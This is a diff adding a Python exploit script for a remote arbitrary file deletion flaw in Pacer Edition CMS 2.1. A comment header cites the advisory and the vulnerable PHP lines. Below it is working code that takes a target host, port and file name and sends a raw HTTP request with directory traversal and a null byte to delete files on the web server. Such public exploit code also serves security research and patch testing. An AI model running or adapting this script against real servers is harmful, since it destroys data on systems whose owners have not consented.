@@ -1,0 +1,96 @@
+#!/usr/bin/python
+#
+#
+# Pacer Edition CMS 2.1 (rm) Remote Arbitrary File Deletion Exploit
+#
+#
+# Vendor: The Pacer Edition
+# Product web page: http://www.thepaceredition.com
+# Affected version: RC 2.1 (SVN: 867)
+#
+# Summary: The 'Pacer Edition' is a Content Management System(CMS)
+# written using PHP 5.2.9 as a minimum requirement. The Pacer Edition
+# CMS was based from Website baker core and has been completely
+# redesigned with a whole new look and feel along with many new
+# advanced features to allow you to build sites exactly how you want
+# and make them, 100% yours!
+#
+# Desc: Input passed to the 'rm' parameter in modules/code/syntax_check.php
+# is not properly sanitised before being used to delete files. This can
+# be exploited to delete files with the permissions of the web server via
+# directory traversal sequences passed within the 'rm' parameter.
+#
+#
+# /modules/code/syntax_check.php (line: 99-102):
+# ----------------------------------------------------------
+#
+# if (isset($_REQUEST['rm'])) {
+#	@unlink($_REQUEST['rm']);
+#	die();
+# }
+#
+# ----------------------------------------------------------
+#
+#
+# Tested on: Microsoft Windows XP Professional SP3 (EN)
+#            Apache 2.2.14 (Win32)
+#            PHP 5.3.1
+#            MySQL 5.1.41
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             liquidworm gmail com
+#                             Zero Science Lab
+#
+#
+# Advisory ID: ZSL-2011-5017
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5017.php
+#
+#
+#
+# 07.06.2011
+#
+
+
+import socket
+import sys
+
+print '\n-------------------------------------------------------------------'
+print '\n Pacer Edition CMS 2.1 (rm) Remote Arbitrary File Deletion Exploit'
+print '\n-------------------------------------------------------------------\n'
+
+if len(sys.argv) < 4:
+	print '\nUsage: ' + sys.argv[0] + ' <target> <port> <file>\n'
+	print 'Example: ' + sys.argv[0] + ' 192.168.16.101 80 naked.jpg\n'
+	sys.exit(0)
+ 
+host = sys.argv[1]
+port = int(sys.argv[2])
+file = sys.argv[3]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(10)
+answ = s.recv(1024)
+
+s.send('POST /modules/code/syntax_check.php?rm=..%2f..%2f..%2f..%2f..%2f..%2f' + file + '%00 HTTP/1.1\r\n'
+       'Host: ' + host + '\r\n'
+       'Connection: keep-alive\r\n'
+       'Content-Length: 0\r\n'
+       'Cache-Control: max-age=0\r\n'
+       'Origin: null\r\n'
+       'User-Agent: thricer\r\n'
+       'Content-Type: multipart/form-data; boundary=----x\r\n'
+       'Accept: text/html\r\n'
+       'Accept-Language: en-US,en;q=0.8\r\n'
+       'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
+       '\r\n\r\n')
+
+htcode = 'HTTP/1.1 200'
+     
+if htcode not in answ[:len(htcode)]:
+	print '- Error deleting file!\n'
+	sys.exit(0)
+else: print '+ File ' + file + 'deleted!\n'
+
+s.close
